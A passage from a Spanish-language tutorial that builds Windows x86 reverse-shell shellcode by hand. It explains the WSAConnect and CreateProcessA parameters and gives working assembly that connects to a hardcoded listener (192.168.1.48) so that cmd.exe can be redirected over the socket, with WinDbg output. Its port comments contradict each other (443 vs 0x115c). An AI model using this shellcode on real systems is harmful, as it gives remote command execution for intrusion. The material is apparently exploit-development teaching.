<p>Primero se insertan los valores nulos, después el valor de <code>IPPROTO_TCP</code>, seguido de esto el <code>type</code> y por último <code>af</code> establecido como 2.</p>
<h3 id="llamada-a-wsaconnect">LLamada a WSAConnect<a class="zola-anchor" href="#llamada-a-wsaconnect" aria-label="Anchor link for: llamada-a-wsaconnect" style="visibility: hidden;"></a>
</h3>
<p>Seguimos con la llamada a <code>WSAConnect</code>, la estructura es la siguiente:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-storage z-type z-c">int</span> WSAAPI <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">WSAConnect</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    SOCKET           <span class="z-variable z-parameter z-c++">s</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-modifier z-c++">const</span> sockaddr  <span class="z-keyword z-operator z-c">*</span><span class="z-variable z-parameter z-c++">name</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-type z-c">int</span>              <span class="z-variable z-parameter z-c++">namelen</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPWSABUF         <span class="z-variable z-parameter z-c++">lpCallerData</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPWSABUF         <span class="z-variable z-parameter z-c++">lpCalleeData</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPQOS            <span class="z-variable z-parameter z-c++">lpSQOS</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPQOS            lpGQOS
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>El primer parámetro que se solicita es el SOCKET (<code>s</code>), este parámetro requiere un descriptor para un socket no conectado, que es exactamente lo que devolvió la llamada anterior a <code>WSASocketA</code>, llegados a este punto, nuestro socket se encuentra en EAX, y debemos asegurarnos de no sobrescribirlo.</p>
<p>El segundo parámetro, es un puntero a la estructura <code>sockaddr</code>, esta estructura varía según el protocolo seleccionado, para el protocolo iPv4 usaremos <code>sockaddr_in</code>, cuya estructura es la siguiente:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-storage z-type z-c++">typedef</span> <span class="z-storage z-type z-c++">struct</span> sockaddr_in <span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-begin z-c++">{</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#if</span> ...
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-storage z-type z-c">short</span> sin_family<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#else</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    ADDRESS_FAMILY sin_family<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-meta z-preprocessor z-c++"><span class="z-keyword z-control z-import z-c++">#endif</span></span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">USHORT</span> sin_port<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    IN_ADDR sin_addr<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">CHAR</span> sin_zero<span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span><span class="z-constant z-numeric z-integer z-decimal z-c++">8</span><span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-end z-c++">}</span></span> SOCKADDR_IN<span class="z-punctuation z-separator z-c++">,</span> <span class="z-keyword z-operator z-c">*</span><span class="z-entity z-name z-type z-typedef z-c++">PSOCKADDR_IN</span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>El primer miembro de la estructura es sin_family, que requiere la familia de direcciones de la dirección de transporte. La documentación oficial nos indica que debemos asegurarnos de que este valor siempre esté establecido en AF_INET.</p>
<p>El siguiente miembro es <code>sin_port</code>, que, como su nombre indica, especifica el puerto. Le sigue <code>sin_addr</code>.  Esta estructura anidada almacenará la dirección IP, <code>sin_addr</code>, una estructura anidada del tipo <code>IN_ADDR</code>.</p>
<p>Se utiliza para iniciar la conexión. La definición de la estructura difiere según cómo se transmite la dirección IP.  Sin embargo, en memoria, las estructuras son idénticas. Esto significa que podemos almacenar la dirección IP dentro de un <code>DWORD</code>.</p>
<p>El último miembro de la estructura <code>sockaddr_in</code> es <code>sin_zero</code>, una matriz de 8 caracteres. Según la documentación oficial, esta matriz está reservada para uso del sistema y su contenido debe establecerse en 0.</p>
<p>Ahora que hemos analizado la estructura sockaddr_in y la estructura anidada IN_ADDR , echemos otro vistazo al prototipo de WSAConnect:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-storage z-type z-c">int</span> WSAAPI <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">WSAConnect</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    SOCKET <span class="z-variable z-parameter z-c++">s</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-modifier z-c++">const</span> sockaddr <span class="z-keyword z-operator z-c">*</span><span class="z-variable z-parameter z-c++">name</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-storage z-type z-c">int</span> <span class="z-variable z-parameter z-c++">namelen</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPWSABUF <span class="z-variable z-parameter z-c++">lpCallerData</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPWSABUF <span class="z-variable z-parameter z-c++">lpCalleeData</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPQOS <span class="z-variable z-parameter z-c++">lpSQOS</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPQOS lpGQOS
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>Después del parámetro <code>*name</code> , que apunta a la estructura <code>sockaddr_in</code> , necesitamos proporcionar el tamaño de la estructura pasada previamente como parámetro namelen . Podemos calcular el tamaño de <code>sockaddr_in</code>, que tiene una longitud de <code>0x10</code> bytes, utilizando los tipos de datos de la definición de la estructura.</p>
<p>Los dos siguientes parámetros, <code>lpCallerData</code> y <code>lpCalleeData</code>, requieren punteros a los datos del usuario que se transferirán hacia y desde el otro socket. Según la documentación, estos parámetros son utilizados por protocolos heredados y no son compatibles con TCP/IP. <strong>Podemos configurarlos como nulo.</strong></p>
<p>El parámetro lpSQOS requiere un puntero a la estructura FLOWSPEC. Esta estructura se utiliza en aplicaciones que admiten parámetros de calidad de servicio (QoS) . Este no es el caso de nuestro shellcode, por lo que podemos establecerlo en NULL. Por último, el parámetro lpGQOS está reservado y debe establecerse en nulo.</p>
<p>Antes de actualizar nuestro shellcode, debemos poner nuestra dirección IP en el formato correcto.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; ? 0n192
</span><span class="z-text z-plain">Evaluate expression: 192 = 000000c0
</span><span class="z-text z-plain">0:004&gt; ? 0n168
</span><span class="z-text z-plain">Evaluate expression: 168 = 000000a8
</span><span class="z-text z-plain">0:004&gt; ? 0n1
</span><span class="z-text z-plain">Evaluate expression: 1 = 00000001
</span><span class="z-text z-plain">0:004&gt; ? 0n48
</span><span class="z-text z-plain">Evaluate expression: 48 = 00000030
</span><span class="z-text z-plain">0:004&gt; ? 0n4444
</span><span class="z-text z-plain">Evaluate expression: 4444 = 0000115c
</span></code></pre>
<p>Ahora que tenemos los valores hexadecimales, podemos seguir con la implementación de la función <code>call_wsaconnect:</code></p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call_wsaconnect:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve el descriptor del SOCKET a ESI
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta sin_zero[]
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta sin_zero[]
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x3001a8c0;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>               <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta sin_addr (192.168.1.48) - 0x301a8c0
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ax, 0xbb01;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve el valor sin_port (443) a AX - 0x115c
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">shl eax, 0x10;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Desplazar EAX 0x10 bytes a la izquierda
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add ax, 0x02;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Añade 0x02 (AF_INET) a AX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta sin_port &amp; sin_family
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta el puntero de la estructura the sockaddr_in
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pop edi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guarda el puntero a sockaddr_in en EDI
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpGQOS
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpSQOS
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpCalleeData
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpCallerData
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add al, 0x10;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Pone AL con un valor de 0x10 (namelen)
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta namelen
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push edi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta *name
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta s
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x28];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llama a WSAConnect
</span></span></code></pre>
<p>La función call_wsaconnect comienza guardando el descriptor de socket (obtenido en el paso anterior) en ESI. Esto solo funcionará si nuestras instrucciones no alteran ESI antes de llamar a WSAConnect.</p>
<p>A continuación, anulamos el registro EAX y lo insertamos dos veces en la pila. Estas dos instrucciones PUSH configuran la matriz de caracteres <code>sin_zero</code> desde la estructura <code>sockaddr_in</code>.</p>
<p>Luego procedemos a ingresar un dword que representa el valor hexadecimal de nuestra dirección IP. Tendremos que insertarlo en orden inverso debido al orden de bytes endian. Esto también aplica a nuestra siguiente instrucción, que mueve una palabra (WORD) al registro AX que contiene la representación hexadecimal del puerto deseado (443).</p>
<p>Usando la instrucción <code>shl</code> , desplazaremos a la izquierda el valor EAX en <code>0x10</code> bytes y luego añadiremos <code>0x02</code> al registro AX. Esto se debe a que los miembros <code>sin_port</code> y <code>sin_family</code> están definidos como USHORT, lo que significa que cada uno tiene dos bytes de longitud.</p>
<p>A continuación, insertaremos el dword resultante en la pila, completando así la estructura <code>sockaddr_in</code> . A continuación, obtendremos un puntero a este mediante las instrucciones <code>push esp</code> y <code>pop edi</code> para usarlo posteriormente.</p>
<p>La siguiente instrucción anula el registro EAX y lo insertamos en la pila cuatro veces. Esto configura los argumentos nulos para nuestra llamada a la función.</p>
<p>A continuación, añadimos <code>0x10</code> al registro AL y lo insertamos en la pila como nuestro argumento <code>namelen</code> . Finalmente, insertamos el puntero a la estructura <code>sockaddr_in</code> , almacenada en EDI, y al descriptor de socket de ESI.</p>
<p>Una vez insertados todos los argumentos procedemos a llamar a <code>WSAConnect</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 1 hit
</span><span class="z-text z-plain">eax=00000010 ebx=76760000 ecx=6a17ad58 edx=00000014 esi=00000204 edi=02cdf294
</span><span class="z-text z-plain">eip=0164011f esp=02cdf278 ebp=02cdf8d8 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">0164011f ff5528          call    dword ptr [ebp+28h]  ss:0023:02cdf900={WS2_32!WSAConnect (76796c80)}
</span></code></pre>
<p><em>Recordad que para que podamos llamar tanto a <code>WSASocketA</code> y <code>WSAConnect</code>, debemos resolver primeros los símbolos y añadirlos en la función <code>resolve_symbols_ws2_32</code>.</em></p>
<h3 id="llamada-a-createprocessa">LLamada a CreateProcessA<a class="zola-anchor" href="#llamada-a-createprocessa" aria-label="Anchor link for: llamada-a-createprocessa" style="visibility: hidden;"></a>
</h3>
<p>Ahora que hemos iniciado con éxito una conexión, necesitamos encontrar una forma de iniciar un cmd.exe procesar y redirigir su entrada y salida a través de nuestra conexión iniciada.</p>
<p>Usaremos la API <code>CreateProcess</code> para, como su nombre indica, crear un nuevo proceso.</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-support z-type z-windows z-c">BOOL</span> <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">CreateProcessA</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">LPCSTR</span> <span class="z-variable z-parameter z-c++">lpApplicationName</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">LPSTR</span> <span class="z-variable z-parameter z-c++">lpCommandLine</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPSECURITY_ATTRIBUTES <span class="z-variable z-parameter z-c++">lpProcessAttributes</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPSECURITY_ATTRIBUTES <span class="z-variable z-parameter z-c++">lpThreadAttributes</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">BOOL</span> <span class="z-variable z-parameter z-c++">bInheritHandles</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span> <span class="z-variable z-parameter z-c++">dwCreationFlags</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">LPVOID</span> <span class="z-variable z-parameter z-c++">lpEnvironment</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    <span class="z-support z-type z-windows z-c">LPCSTR</span> <span class="z-variable z-parameter z-c++">lpCurrentDirectory</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPSTARTUPINFOA <span class="z-variable z-parameter z-c++">lpStartupInfo</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">    LPPROCESS_INFORMATION lpProcessInformation
</span></span></span></code></pre>
<p>El primer parámetro requerido por la API es <code>lpApplicationName</code>. Este parámetro debe contener un puntero a una cadena que representa la aplicación que se ejecutará.</p>
<p>Si el parámetro se establece en nulo, el segundo parámetro (<code>lpCommandLine</code>) no puede ser nulo, y viceversa. Este parámetro espera un puntero a una cadena que contiene la línea de comandos que se ejecutará.</p>
<p>Nuestro shellcode utilizará este parámetro para ejecutar cmd.exe.</p>
<p>A continuación, abordaremos los parámetros <code>lpProcessAttributes</code> y <code>lpThreadAttributes</code> , que requieren punteros a estructuras de tipo <strong>SECURITY_ATTRIBUTES</strong> . Para nuestro shellcode, estos parámetros pueden establecerse en nulo.</p>
<p>El siguiente parámetro, bInheritHandles, espera un valor TRUE (1) o FALSE (0). Este valor determina si los handles heredables del proceso de llamada de Python son heredados por el nuevo proceso (cmd.exe). Necesitaremos establecer este valor en TRUE para nuestra shell inversa.</p>
<p>A <code>bInheritHandles</code> le sigue el parámetro <code>dwCreationFlags</code>, que acepta varios flags de creación de procesos. Si este valor se establece en nulo, el proceso <code>cmd.exe</code> utilizará los mismos flags de creación que el proceso que lo invocó.</p>
<p>El parámetro <code>lpEnvironment</code> espera un puntero a un bloque de entorno. Según la documentación oficial, si este parámetro se establece en nulo, el nuevo proceso compartirá el mismo bloque de entorno que el proceso que realiza la llamada.</p>
<p><code>lpCurrentDirectory</code> nos permite especificar la ruta completa al directorio desde el cual se iniciará el nuevo proceso. Si se establece en nulo, el proceso utilizará el mismo directorio que el proceso actual.</p>
<p>En el caso de <code>cmd.exe</code>, como está incluido en el <code>PATH</code>, puede ejecutarse desde cualquier ubicación. Sin embargo, dependiendo del proceso que ejecute el shellcode, este parámetro podría ser necesario.</p>
<p>Dado que la estructura <code>PROCESS_INFORMATION</code> se rellenará como parte de la API, solo necesitamos conocer su tamaño. Por otro lado, la estructura <code>STARTUPINFOA</code> debe pasarse a la API mediante nuestro shellcode.</p>
<p>La estructura es la siguiente:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-storage z-type z-c++">typedef</span> <span class="z-storage z-type z-c++">struct</span> _STARTUPINFOA <span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-begin z-c++">{</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  cb<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">LPSTR</span>  lpReserved<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">LPSTR</span>  lpDesktop<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">LPSTR</span>  lpTitle<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwX<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwY<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwXSize<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwYSize<span class="z-punctuation z-terminator z-c++">;</span>
